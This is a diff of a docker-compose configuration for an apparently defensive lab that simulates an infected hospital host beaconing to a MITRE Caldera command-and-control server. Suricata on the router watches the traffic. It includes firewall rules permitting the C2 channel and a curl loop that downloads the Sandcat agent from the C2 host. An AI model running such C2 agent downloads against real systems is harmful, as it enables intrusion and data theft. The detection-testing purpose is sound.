@@ -49,13 +49,29 @@ services:
       sh -c "
         apk add --no-cache iptables &&
         iptables -P FORWARD DROP &&
-        iptables -A FORWARD -i eth0 -o eth1 -p tcp --dport 80 -j ACCEPT &&
+
+        # attack_net <-> dmz_net: HTTP/HTTPS (attacker browse to frontend)
+        iptables -A FORWARD -i eth0 -o eth1 -p tcp --dport 80  -j ACCEPT &&
         iptables -A FORWARD -i eth0 -o eth1 -p tcp --dport 443 -j ACCEPT &&
         iptables -A FORWARD -i eth1 -o eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT &&
+
+        # dmz_net <-> internal_net: API traffic
         iptables -A FORWARD -i eth1 -o eth2 -p tcp --dport 8000 -j ACCEPT &&
         iptables -A FORWARD -i eth2 -o eth1 -m state --state ESTABLISHED,RELATED -j ACCEPT &&
+
+        # internal_net -> attack_net: C2 channel (Sandcat agent -> Caldera)
+        # Questo e' il traffico critico che Suricata deve vedere:
+        # beacon POST /beacon, risultati PUT /result, upload POST /file/upload
+        iptables -A FORWARD -i eth2 -o eth0 -p tcp --dport 8888 -j ACCEPT &&
+        iptables -A FORWARD -i eth0 -o eth2 -m state --state ESTABLISHED,RELATED -j ACCEPT &&
+
+        # internal_net -> attack_net: download agente al bootstrap (porta 8888)
+        # (gia' coperto dalla regola sopra)
+
+        # Blocco esplicito: attack_net non puo' raggiungere internal_net direttamente
         iptables -A FORWARD -i eth0 -o eth2 -j DROP &&
-        echo 'Firewall rules applied' &&
+
+        echo 'Firewall rules applied — C2 channel internal->attack ALLOWED' &&
         tail -f /dev/null
       "
     restart: unless-stopped
@@ -169,13 +185,18 @@ services:
       uv run uvicorn api.main:app --host 0.0.0.0 --port 8000"
 
   agent:
+    # Host compromesso nella rete interna — simula una macchina ospedaliera infettata.
+    # NON ha accesso diretto alla attack_net: deve passare per il router per
+    # raggiungere il C2 (Caldera su 10.10.1.10:8888). Questo forza TUTTO il
+    # traffico C2 (beacon, result, exfil) attraverso il namespace del router
+    # dove Suricata e' in ascolto — rendendolo visibile all'IDS.
     image: alpine:latest
     container_name: sim_agent
     networks:
       internal_net:
         ipv4_address: 10.10.3.20
-      attack_net:
-        ipv4_address: 10.10.1.30
+      # attack_net RIMOSSA: un host compromesso interno non ha una NIC
+      # direttamente sulla rete dell'attaccante.
     depends_on:
       - api
     restart: on-failure
@@ -187,14 +208,15 @@ services:
       - ../:/app
     command: |
       sh -c "apk add --no-cache curl openssl nmap nmap-scripts tar iproute2 && \
+      ip route add 10.10.1.0/24 via 10.10.3.254 && \
       ip route add 10.10.2.0/24 via 10.10.3.254 && \
       while true; do \
         HTTP_STATUS=$$(curl -s -o sandcat.go -w '%{http_code}' -X POST -H 'file:sandcat.go' -H 'platform:linux' $${CALDERA_URL}/file/download); \
         if [ \"$$HTTP_STATUS\" = '200' ] && [ -s sandcat.go ]; then \
-          echo 'Agent downloaded successfully.'; \
+          echo '[agent] Sandcat downloaded successfully — routing via router to C2.'; \
           break; \
         fi; \
-        echo \"Waiting for Caldera at $${CALDERA_URL}... (status: $$HTTP_STATUS)\"; \
+        echo \"[agent] Waiting for Caldera at $${CALDERA_URL}... (status: $$HTTP_STATUS)\"; \
         rm -f sandcat.go; \
         sleep 5; \
       done && \
